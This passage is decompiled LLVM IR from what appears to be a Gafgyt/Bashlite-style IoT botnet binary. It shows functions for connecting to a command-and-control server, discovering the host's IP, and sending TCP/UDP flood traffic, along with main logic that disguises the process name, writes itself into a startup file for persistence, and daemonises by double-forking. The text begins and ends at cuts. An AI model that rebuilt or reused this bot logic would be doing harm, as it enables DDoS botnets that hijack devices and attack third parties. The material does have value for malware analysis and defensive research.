  uselistorder i32 %v2_1000a748, { 1, 0 }
  uselistorder i32 %v2_1000a730, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-80, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %tmp, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 6, 7, 21, 4, 22, 23, 24, 25, 3, 26, 27, 28, 2, 1, 0, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10016524.368 to i32), { 3, 12, 4, 13, 2, 14, 5, 15, 1, 16, 6, 17, 0, 18, 7, 19, 8, 20, 9, 21, 10, 22, 11, 23 }
  uselistorder i32 (i32)* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10015650.30 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b41c, { 22, 6, 5, 14, 4, 15, 7, 2, 10, 11, 3, 12, 16, 8, 0, 1, 17, 18, 19, 9, 13, 20, 21 }
  uselistorder label %dec_label_pc_1000b3f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b33c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b330, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b2ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000b274, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b224, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b098, { 1, 0 }
  uselistorder label %dec_label_pc_1000b060, { 1, 0 }
  uselistorder label %dec_label_pc_1000af4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ad50, { 1, 0 }
  uselistorder label %dec_label_pc_1000aca0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac24, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000abc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab48, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab10, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a938, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a898, { 1, 0 }
  uselistorder label %dec_label_pc_1000a854, { 1, 0 }
  uselistorder label %dec_label_pc_1000a81c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a808, { 1, 0 }
  uselistorder label %dec_label_pc_1000a728, { 1, 0 }
  uselistorder label %dec_label_pc_1000a54c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a4d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a400, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_1000b45c = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268481652, i32* @lr, align 4
  %v3_1000b470 = call i32 @__GI_memset(i32 %v2_1000b45c, i32 0, i32 4096)
  %v3_1000b478 = load i32, i32* @global_var_100287d0.29, align 4
  %v3_1000b47c = icmp eq i32 %v3_1000b478, 0
  br i1 %v3_1000b47c, label %dec_label_pc_1000b4a0, label %dec_label_pc_1000b484

dec_label_pc_1000b484:                            ; preds = %entry
  store i32 268481684, i32* @lr, align 4
  %v1_1000b490 = call i32 @__libc_close(i32 %v3_1000b478)
  store i32 0, i32* @global_var_100287d0.29, align 4
  br label %dec_label_pc_1000b4a0

dec_label_pc_1000b4a0:                            ; preds = %entry, %dec_label_pc_1000b484
  %v3_1000b4a4 = load i32, i32* @global_var_1002878c.558, align 4
  %v3_1000b4a8 = icmp eq i32 %v3_1000b4a4, 0
  br i1 %v3_1000b4a8, label %dec_label_pc_1000b4b0, label %dec_label_pc_1000b4c0

dec_label_pc_1000b4b0:                            ; preds = %dec_label_pc_1000b4a0
  br label %dec_label_pc_1000b4d4

dec_label_pc_1000b4c0:                            ; preds = %dec_label_pc_1000b4a0
  %v1_1000b4c8 = add i32 %v3_1000b4a4, 1
  br label %dec_label_pc_1000b4d4

dec_label_pc_1000b4d4:                            ; preds = %dec_label_pc_1000b4b0, %dec_label_pc_1000b4c0
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b4b0 ], [ %v1_1000b4c8, %dec_label_pc_1000b4c0 ]
  store i32 %storemerge, i32* @global_var_1002878c.558, align 4
  %v1_1000b4e8 = mul i32 %storemerge, 4
  %v2_1000b4ec = add i32 %v1_1000b4e8, ptrtoint ([16 x i8]** @global_var_10028788.560 to i32)
  %v1_1000b4f0 = inttoptr i32 %v2_1000b4ec to i32*
  %v2_1000b4f0 = load i32, i32* %v1_1000b4f0, align 4
  %v2_1000b4fc = inttoptr i32 %v2_1000b4f0 to i8*
  %v3_1000b4fc = call i32 @strcpy(i32 %v2_1000b45c, i8* %v2_1000b4fc)
  store i32 %v2_1000b45c, i32* @r3, align 4
  store i32 268481816, i32* @lr, align 4
  %v2_1000b514 = call i32 @__GI_strchr(i32 %v2_1000b45c, i32 58)
  %v3_1000b51c = icmp eq i32 %v2_1000b514, 0
  br i1 %v3_1000b51c, label %dec_label_pc_1000b56c, label %dec_label_pc_1000b524

dec_label_pc_1000b524:                            ; preds = %dec_label_pc_1000b4d4
  store i32 %v2_1000b45c, i32* @r3, align 4
  store i32 268481844, i32* @lr, align 4
  %v2_1000b530 = call i32 @__GI_strchr(i32 %v2_1000b45c, i32 58)
  %v1_1000b538 = add i32 %v2_1000b530, 1
  store i32 268481860, i32* @lr, align 4
  %v2_1000b540 = call i32 @atol(i32 %v1_1000b538, i32 %v2_1000b530)
  store i32 %v2_1000b45c, i32* @r3, align 4
  store i32 268481884, i32* @lr, align 4
  %v2_1000b558 = call i32 @__GI_strchr(i32 %v2_1000b45c, i32 58)
  %v3_1000b568 = inttoptr i32 %v2_1000b558 to i8*
  store i8 0, i8* %v3_1000b568, align 1
  br label %dec_label_pc_1000b56c

dec_label_pc_1000b56c:                            ; preds = %dec_label_pc_1000b4d4, %dec_label_pc_1000b524
  %stack_var_-4136.0 = phi i32 [ 23, %dec_label_pc_1000b4d4 ], [ %v2_1000b540, %dec_label_pc_1000b524 ]
  store i32 268481916, i32* @lr, align 4
  %v3_1000b578 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1000b578, i32* @global_var_100287d0.29, align 4
  store i32 268481960, i32* @lr, align 4
  %v5_1000b5a4 = call i32 @connectTimeout(i32 %v3_1000b578, i32 %v2_1000b45c, i32 %stack_var_-4136.0, i32 30, i32 %v2_1000b45c)
  %v3_1000b5ac = icmp eq i32 %v5_1000b5a4, 0
  %. = zext i1 %v3_1000b5ac to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000b45c, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b56c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b4d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b4a0, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268482060, i32* @lr, align 4
  %v3_1000b608 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_1000b61c = icmp eq i32 %v3_1000b608, -1
  br i1 %v4_1000b61c, label %dec_label_pc_1000b624, label %dec_label_pc_1000b630

dec_label_pc_1000b624:                            ; preds = %entry
  br label %dec_label_pc_1000b85c

dec_label_pc_1000b630:                            ; preds = %entry
  %v2_1000b630 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268482152, i32* @lr, align 4
  %v2_1000b664 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_10016ad0.562 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000b674 = call i32 @htons(i32 53)
  store i32 268482196, i32* @lr, align 4
  %v3_1000b690 = call i32 @__libc_connect(i32 %v3_1000b608, i32 %v2_1000b630, i32 16)
  %v4_1000b6a4 = icmp eq i32 %v3_1000b690, -1
  br i1 %v4_1000b6a4, label %dec_label_pc_1000b6ac, label %dec_label_pc_1000b6b8

dec_label_pc_1000b6ac:                            ; preds = %dec_label_pc_1000b630
  br label %dec_label_pc_1000b85c

dec_label_pc_1000b6b8:                            ; preds = %dec_label_pc_1000b630
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000b6c0 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_1000b6c4 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268482264, i32* @lr, align 4
  %v4_1000b6d4 = call i32 @__GI_getsockname(i32 %v3_1000b608, i32 %v2_1000b6c0, i32 %v2_1000b6c4, i32 %v2_1000b6c4)
  %v4_1000b6e8 = icmp eq i32 %v4_1000b6d4, -1
  br i1 %v4_1000b6e8, label %dec_label_pc_1000b6f0, label %dec_label_pc_1000b6fc

dec_label_pc_1000b6f0:                            ; preds = %dec_label_pc_1000b6b8
  br label %dec_label_pc_1000b85c

dec_label_pc_1000b6fc:                            ; preds = %dec_label_pc_1000b6b8
  store i32 268482332, i32* @lr, align 4
  %v3_1000b718 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_10016ad8.563 to i32), i32 0)
  %v2_1000b79c = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_1000b79c

dec_label_pc_1000b728:                            ; preds = %dec_label_pc_1000b79c
  store i32 268482364, i32* @lr, align 4
  %v5_1000b738 = call i32 @strstr(i32 %v2_1000b79c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10016ae8.564, i32 0, i32 0), i32 268500992)
  %v3_1000b740 = icmp eq i32 %v5_1000b738, 0
  br i1 %v3_1000b740, label %dec_label_pc_1000b784, label %dec_label_pc_1000b760.preheader

dec_label_pc_1000b760.preheader:                  ; preds = %dec_label_pc_1000b728
  %v2_1000b76410 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b76c14 = icmp eq i8 %v2_1000b76410, 9
  br i1 %v3_1000b76c14, label %dec_label_pc_1000b774, label %dec_label_pc_1000b754

dec_label_pc_1000b754:                            ; preds = %dec_label_pc_1000b760.preheader, %dec_label_pc_1000b754
  %v4_1000b76015 = phi i32 [ %v1_1000b758, %dec_label_pc_1000b754 ], [ %v2_1000b79c, %dec_label_pc_1000b760.preheader ]
  %v1_1000b758 = add i32 %v4_1000b76015, 1
  %v5_1000b75c = inttoptr i32 %v1_1000b758 to i8*
  %v2_1000b764 = load i8, i8* %v5_1000b75c, align 1
  %v3_1000b76c = icmp eq i8 %v2_1000b764, 9
  br i1 %v3_1000b76c, label %dec_label_pc_1000b774, label %dec_label_pc_1000b754

dec_label_pc_1000b774:                            ; preds = %dec_label_pc_1000b754, %dec_label_pc_1000b760.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000b760.preheader ], [ %v5_1000b75c, %dec_label_pc_1000b754 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_1000b7bc

dec_label_pc_1000b784:                            ; preds = %dec_label_pc_1000b728
  store i32 268482460, i32* @lr, align 4
  %v3_1000b798 = call i32 @__GI_memset(i32 %v2_1000b79c, i32 0, i32 4096)
  br label %dec_label_pc_1000b79c

dec_label_pc_1000b79c:                            ; preds = %dec_label_pc_1000b6fc, %dec_label_pc_1000b784
  %v3_1000b7ac = call i32 @fdgets(i32 %v2_1000b79c, i32 4096, i32 %v3_1000b718)
  %v3_1000b7b4 = icmp eq i32 %v3_1000b7ac, 0
  br i1 %v3_1000b7b4, label %dec_label_pc_1000b7bc, label %dec_label_pc_1000b728

dec_label_pc_1000b7bc:                            ; preds = %dec_label_pc_1000b79c, %dec_label_pc_1000b774
  store i32 268482500, i32* @lr, align 4
  %v1_1000b7c0 = call i32 @__libc_close(i32 %v3_1000b718)
  %v3_1000b7c4 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b7cc = icmp eq i8 %v3_1000b7c4, 0
  br i1 %v3_1000b7cc, label %dec_label_pc_1000b850, label %dec_label_pc_1000b7d4

dec_label_pc_1000b7d4:                            ; preds = %dec_label_pc_1000b7bc
  %v2_1000b7d4 = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000b7e4 = call i32 @strcpy(i32 %v2_1000b7d4, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000b804.565 to i32), i32* @lr, align 4
  %v3_1000b800 = call i32 @ioctl(i32 %v3_1000b608, i32 35111, i32 %v2_1000b7d4)
  %v2_1000b818 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_1000b810

dec_label_pc_1000b810:                            ; preds = %dec_label_pc_1000b7d4, %dec_label_pc_1000b810
  %storemerge58 = phi i32 [ 0, %dec_label_pc_1000b7d4 ], [ %v1_1000b83c, %dec_label_pc_1000b810 ]
  %v2_1000b820 = add i32 %storemerge58, %v2_1000b818
  %v1_1000b824 = inttoptr i32 %v2_1000b820 to i8*
  %v2_1000b824 = load i8, i8* %v1_1000b824, align 1
  %v4_1000b834 = add i32 %storemerge58, ptrtoint (i32* @global_var_100287e0.566 to i32)
  %v5_1000b834 = inttoptr i32 %v4_1000b834 to i8*
  store i8 %v2_1000b824, i8* %v5_1000b834, align 1
  %v1_1000b83c = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_1000b83c, 6
  br i1 %tmp37, label %dec_label_pc_1000b810, label %dec_label_pc_1000b850

dec_label_pc_1000b850:                            ; preds = %dec_label_pc_1000b810, %dec_label_pc_1000b7bc
  store i32 ptrtoint (i32* @global_var_1000b858.567 to i32), i32* @lr, align 4
  %v1_1000b854 = call i32 @__libc_close(i32 %v3_1000b608)
  br label %dec_label_pc_1000b864

dec_label_pc_1000b85c:                            ; preds = %dec_label_pc_1000b6f0, %dec_label_pc_1000b6ac, %dec_label_pc_1000b624
  br label %dec_label_pc_1000b864

dec_label_pc_1000b864:                            ; preds = %dec_label_pc_1000b850, %dec_label_pc_1000b85c
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_1000b85c ], [ %tmp, %dec_label_pc_1000b850 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_1000b758, { 1, 0 }
  uselistorder i32 %v2_1000b79c, { 3, 1, 0, 2 }
  uselistorder i32 %v3_1000b608, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 11, 10, 9, 8, 7, 6, 5, 4, 12, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b864, { 1, 0 }
  uselistorder label %dec_label_pc_1000b810, { 1, 0 }
  uselistorder label %dec_label_pc_1000b79c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b754, { 1, 0 }
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([9 x i8]* @global_var_10016af4.568 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-4192 = alloca i32, align 4
  %stack_var_-5816 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5732 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-5472 = alloca i32, align 4
  %stack_var_-5728 = alloca i32, align 4
  %v1_1000b8dc = bitcast i8** %argv to i32*
  %v2_1000b8dc = load i32, i32* %v1_1000b8dc, align 4
  store i32 %v2_1000b8dc, i32* @r3, align 4
  %v0_1000b8f0 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_10016b00.569 to i32), i32* @r4, align 4
  store i32 268482828, i32* @lr, align 4
  %v3_1000b908 = call i32 @strncpy(i32 %v2_1000b8dc, i32 ptrtoint (i32* @global_var_10016b00.569 to i32), i32 %v0_1000b8f0)
  store i32 ptrtoint (i32* @global_var_10016b00.569 to i32), i32* %v1_1000b8dc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b93c.570 to i32), i32* @lr, align 4
  %v7_1000b938 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_10016b00.569 to i32), i32 0, i32 0, i32 0, i32 %tmp)
  store i32 268482884, i32* @lr, align 4
  %v1_1000b940 = call i32 @__GI_time(i32 0)
  store i32 268482892, i32* @lr, align 4
  %v0_1000b948 = call i32 @__libc_getpid()
  %v2_1000b950 = xor i32 %v1_1000b940, %v0_1000b948
  store i32 ptrtoint ([3 x i8]* @global_var_1000b95c.571 to i32), i32* @lr, align 4
  %v1_1000b958 = call i32 @srand(i32 %v2_1000b950)
  store i32 268482916, i32* @lr, align 4
  %v1_1000b960 = call i32 @__GI_time(i32 0)
  store i32 268482924, i32* @lr, align 4
  %v0_1000b968 = call i32 @__libc_getpid()
  %v2_1000b970 = xor i32 %v1_1000b960, %v0_1000b968
  %v1_1000b978 = call i32 @init_rand(i32 %v2_1000b970)
  store i32 268482976, i32* @lr, align 4
  %v3_1000b99c = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_10016b04.573 to i32), i32 ptrtoint ([2 x i8]* @global_var_10016b18.574 to i32))
  %v3_1000b9ac = icmp eq i32 %v3_1000b99c, 0
  br i1 %v3_1000b9ac, label %dec_label_pc_1000b9b4, label %dec_label_pc_1000b9d8

dec_label_pc_1000b9b4:                            ; preds = %entry
  store i32 268483024, i32* @lr, align 4
  %v3_1000b9cc = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_10016b1c.575 to i32), i32 ptrtoint ([2 x i8]* @global_var_10016b18.574 to i32))
  br label %dec_label_pc_1000b9d8

dec_label_pc_1000b9d8:                            ; preds = %entry, %dec_label_pc_1000b9b4
  %stack_var_-5756.0 = phi i32 [ %v3_1000b9cc, %dec_label_pc_1000b9b4 ], [ %v3_1000b99c, %entry ]
  %stack_var_-5752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10016b1c.575, i32 0, i32 0), %dec_label_pc_1000b9b4 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_10016b04.573, i32 0, i32 0), %entry ]
  %v3_1000b9dc = icmp eq i32 %stack_var_-5756.0, 0
  br i1 %v3_1000b9dc, label %dec_label_pc_1000bb58, label %dec_label_pc_1000b9e4

dec_label_pc_1000b9e4:                            ; preds = %dec_label_pc_1000b9d8
  %v2_1000b9e8 = load i32, i32* %v1_1000b8dc, align 4
  store i32 %v2_1000b9e8, i32* @r3, align 4
  %v0_1000b9f0 = call i32 @__GI_strlen()
  %v2_1000ba04 = ptrtoint i32* %stack_var_-5728 to i32
  store i32 268483092, i32* @lr, align 4
  %v2_1000ba10 = call i32 @getcwd(i32 %v2_1000ba04, i32 256)
  store i32 ptrtoint (i32* @global_var_10016b2c.576 to i32), i32* @r4, align 4
  %v2_1000ba24 = bitcast i32* %stack_var_-5728 to i8*
  %v3_1000ba24 = call i32 @__GI_strcoll(i8* %v2_1000ba24, i32 ptrtoint (i32* @global_var_10016b2c.576 to i32))
  %v3_1000ba2c = icmp eq i32 %v3_1000ba24, 0
  br i1 %v3_1000ba2c, label %dec_label_pc_1000bb50, label %dec_label_pc_1000ba44.preheader

dec_label_pc_1000ba44.preheader:                  ; preds = %dec_label_pc_1000b9e4
  %v2_1000ba48115 = load i32, i32* %v1_1000b8dc, align 4
  %v2_1000ba50116 = add i32 %v2_1000ba48115, %v0_1000b9f0
  %v1_1000ba54117 = inttoptr i32 %v2_1000ba50116 to i8*
  %v2_1000ba54118 = load i8, i8* %v1_1000ba54117, align 1
  %v3_1000ba5c122 = icmp eq i8 %v2_1000ba54118, 47
  br i1 %v3_1000ba5c122, label %dec_label_pc_1000ba64, label %dec_label_pc_1000ba38

dec_label_pc_1000ba38:                            ; preds = %dec_label_pc_1000ba44.preheader, %dec_label_pc_1000ba38
  %stack_var_-5760.0123 = phi i32 [ %v1_1000ba3c, %dec_label_pc_1000ba38 ], [ %v0_1000b9f0, %dec_label_pc_1000ba44.preheader ]
  %v1_1000ba3c = add i32 %stack_var_-5760.0123, -1
  %v2_1000ba48 = load i32, i32* %v1_1000b8dc, align 4
  %v2_1000ba50 = add i32 %v2_1000ba48, %v1_1000ba3c
  %v1_1000ba54 = inttoptr i32 %v2_1000ba50 to i8*
  %v2_1000ba54 = load i8, i8* %v1_1000ba54, align 1
  %v3_1000ba5c = icmp eq i8 %v2_1000ba54, 47
  br i1 %v3_1000ba5c, label %dec_label_pc_1000ba64, label %dec_label_pc_1000ba38

dec_label_pc_1000ba64:                            ; preds = %dec_label_pc_1000ba38, %dec_label_pc_1000ba44.preheader
  %stack_var_-5760.0.lcssa = phi i32 [ %v0_1000b9f0, %dec_label_pc_1000ba44.preheader ], [ %v1_1000ba3c, %dec_label_pc_1000ba38 ]
  %v2_1000ba68 = load i32, i32* %v1_1000b8dc, align 4
  %v2_1000ba70 = add i32 %v2_1000ba68, %stack_var_-5760.0.lcssa
  %v2_1000ba74 = ptrtoint i32* %stack_var_-5472 to i32
  store i32 %v2_1000ba74, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000ba98.578 to i32), i32* @lr, align 4
  %v6_1000ba94 = load i32, i32* @r8, align 4
  %v9_1000ba94 = call i32 @sprintf(i32 %v2_1000ba74, i32 ptrtoint ([8 x i8]* @global_var_10016b30.577 to i32), i32 %v2_1000ba04, i32 %v2_1000ba70, i32 268500992, i32 %v6_1000ba94, i32 268500992, i32 ptrtoint (i32* @0 to i32))
  %v2_1000ba9c = ptrtoint i32* %stack_var_-5216 to i32
  br label %dec_label_pc_1000badc.outer

dec_label_pc_1000ba9c:                            ; preds = %dec_label_pc_1000badc
  store i32 268483248, i32* @lr, align 4
  %v3_1000baac = call i32 @fgets(i32 %v2_1000ba9c, i32 1024, i32 %stack_var_-5756.0)
  store i32 %v2_1000ba9c, i32* @r3, align 4
  store i32 %v2_1000ba74, i32* @r4, align 4
  %v2_1000bac0 = call i32 @__GI_strcasecmp(i32 %v2_1000ba9c, i32 %v2_1000ba74)
  %v3_1000bac8 = icmp eq i32 %v2_1000bac0, 0
  br i1 %v3_1000bac8, label %dec_label_pc_1000bad0, label %dec_label_pc_1000badc

dec_label_pc_1000bad0:                            ; preds = %dec_label_pc_1000ba9c
  %v1_1000bad4 = add i32 %stack_var_-5764.0.ph, 1
  br label %dec_label_pc_1000badc.outer

dec_label_pc_1000badc.outer:                      ; preds = %dec_label_pc_1000bad0, %dec_label_pc_1000ba64
  %stack_var_-5764.0.ph = phi i32 [ %v1_1000bad4, %dec_label_pc_1000bad0 ], [ 0, %dec_label_pc_1000ba64 ]
  br label %dec_label_pc_1000badc

dec_label_pc_1000badc:                            ; preds = %dec_label_pc_1000badc.outer, %dec_label_pc_1000ba9c
  store i32 268483300, i32* @lr, align 4
  %v1_1000bae0 = call i32 @feof(i32 %stack_var_-5756.0)
  %v3_1000bae8 = icmp eq i32 %v1_1000bae0, 0
  br i1 %v3_1000bae8, label %dec_label_pc_1000ba9c, label %dec_label_pc_1000baf0

dec_label_pc_1000baf0:                            ; preds = %dec_label_pc_1000badc
  %v3_1000baf4 = icmp eq i32 %stack_var_-5764.0.ph, 0
  br i1 %v3_1000baf4, label %dec_label_pc_1000bafc, label %dec_label_pc_1000bb44

dec_label_pc_1000bafc:                            ; preds = %dec_label_pc_1000baf0
  store i32 268483332, i32* @lr, align 4
  %v1_1000bb00 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000bb00 = call i32 @__GI_fclose(i16* %v1_1000bb00)
  %v4_1000bb04 = ptrtoint i8* %stack_var_-5752.0 to i32
  store i32 268483348, i32* @lr, align 4
  %v3_1000bb10 = call i32 @__GI_fopen(i32 %v4_1000bb04, i32 ptrtoint (i32* @global_var_10016b38.579 to i32))
  %v3_1000bb20 = icmp eq i32 %v3_1000bb10, 0
  br i1 %v3_1000bb20, label %dec_label_pc_1000bb58, label %dec_label_pc_1000bb28

dec_label_pc_1000bb28:                            ; preds = %dec_label_pc_1000bafc
  store i32 268483384, i32* @lr, align 4
  %v2_1000bb34 = call i32 @__GI_fputs(i32 %v2_1000ba74, i32 %v3_1000bb10)
  store i32 ptrtoint (i32* @global_var_1000bb40.580 to i32), i32* @lr, align 4
  %v1_1000bb3c = inttoptr i32 %v3_1000bb10 to i16*
  %v2_1000bb3c = call i32 @__GI_fclose(i16* %v1_1000bb3c)
  br label %dec_label_pc_1000bb58

dec_label_pc_1000bb44:                            ; preds = %dec_label_pc_1000baf0
  store i32 ptrtoint (i32* @global_var_1000bb4c.581 to i32), i32* @lr, align 4
  %v1_1000bb48 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000bb48 = call i32 @__GI_fclose(i16* %v1_1000bb48)
  br label %dec_label_pc_1000bb58

dec_label_pc_1000bb50:                            ; preds = %dec_label_pc_1000b9e4
  store i32 268483416, i32* @lr, align 4
  %v1_1000bb54 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000bb54 = call i32 @__GI_fclose(i16* %v1_1000bb54)
  br label %dec_label_pc_1000bb58

dec_label_pc_1000bb58:                            ; preds = %dec_label_pc_1000bafc, %dec_label_pc_1000b9d8, %dec_label_pc_1000bb44, %dec_label_pc_1000bb28, %dec_label_pc_1000bb50
  store i32 ptrtoint (i32* @global_var_1000bb5c.582 to i32), i32* @lr, align 4
  %v0_1000bb58 = call i32 @getOurIP()
  store i32 268483424, i32* @lr, align 4
  %v0_1000bb5c = call i32 @__libc_fork()
  %v3_1000bb6c = icmp eq i32 %v0_1000bb5c, 0
  br i1 %v3_1000bb6c, label %dec_label_pc_1000bb9c, label %dec_label_pc_1000bbe0

dec_label_pc_1000bb9c:                            ; preds = %dec_label_pc_1000bb58
  store i32 268483488, i32* @lr, align 4
  %v0_1000bb9c = call i32 @__libc_fork()
  %v3_1000bbac = icmp eq i32 %v0_1000bb9c, 0
  br i1 %v3_1000bbac, label %dec_label_pc_1000bbbc.thread, label %dec_label_pc_1000bbc8

dec_label_pc_1000bbbc.thread:                     ; preds = %dec_label_pc_1000bb9c
  br label %dec_label_pc_1000bbf4

dec_label_pc_1000bbc8:                            ; preds = %dec_label_pc_1000bb9c
  %v0_1000bbb8 = call i32 @__GI_exit()
  %v3_1000bbd8 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_10016b3c.584 to i32), i32 268500992)
  br label %dec_label_pc_1000bbf4

dec_label_pc_1000bbe0:                            ; preds = %dec_label_pc_1000bb58
  %v2_1000bb74 = ptrtoint i32* %stack_var_-5732 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000bb88.583 to i32), i32* @lr, align 4
  %v3_1000bb84 = call i32 @__libc_waitpid(i32 %v0_1000bb5c, i32 %v2_1000bb74, i32 0)
  %v0_1000bb8c = call i32 @__GI_exit()
  %v3_1000bbf0 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_10016b3c.584 to i32), i32 268500992)
  br label %dec_label_pc_1000bbf4

dec_label_pc_1000bbf4:                            ; preds = %dec_label_pc_1000bbbc.thread, %dec_label_pc_1000bbc8, %dec_label_pc_1000bbe0
  store i32 268483576, i32* @lr, align 4
  %v0_1000bbf4 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_1000bc04.587 to i32), i32* @lr, align 4
  %v2_1000bc00 = call i32 @chdir(i32 ptrtoint (i32* @global_var_10016b2c.576 to i32), i32 268500992)
  store i32 ptrtoint (i32* @global_var_1000bc10.588 to i32), i32* @lr, align 4
  %v2_1000bc0c = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000c498 = ptrtoint i32* %stack_var_-4192 to i32
  %v4_1000c4a8 = bitcast i32* %stack_var_-4192 to i8*
  %v2_1000bf60 = ptrtoint i32* %stack_var_-5816 to i32
  %v2_1000c230 = ptrtoint i32* %stack_var_-5216 to i32
  %v1_1000c09c = or i32 %v2_1000c498, 1
  %v2_1000c460 = add i32 %v2_1000bf60, 344
  br label %dec_label_pc_1000bc14.outer

dec_label_pc_1000bc14.outer:                      ; preds = %dec_label_pc_1000bfe4, %dec_label_pc_1000c490, %dec_label_pc_1000bbf4
  %stack_var_-5748.0.ph21 = phi i32 [ 0, %dec_label_pc_1000bbf4 ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000c490 ], [ %v1_1000bfe8, %dec_label_pc_1000bfe4 ]
